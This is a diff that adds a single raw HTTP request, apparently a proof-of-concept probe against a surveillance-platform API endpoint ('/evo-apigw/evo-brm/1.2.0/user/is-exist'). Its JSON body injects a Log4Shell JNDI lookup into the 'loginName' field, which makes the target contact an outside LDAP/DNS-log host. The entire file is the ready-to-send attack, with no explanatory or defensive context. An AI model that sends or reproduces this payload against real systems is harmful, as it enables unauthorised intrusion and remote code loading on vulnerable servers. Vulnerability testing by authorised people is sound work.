@@ -1,0 +1,9 @@
+POST /evo-apigw/evo-brm/1.2.0/user/is-exist HTTP/1.1
+Host: 11.11.11.11
+User-Agent: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+Connection: close
+Content-Length: 47
+Content-Type: application/json;charset=utf-8
+Accept-Encoding: gzip, deflate
+
+{"loginName":"${jndi:ldap://k7ujpoo2.eyes.sh}"}
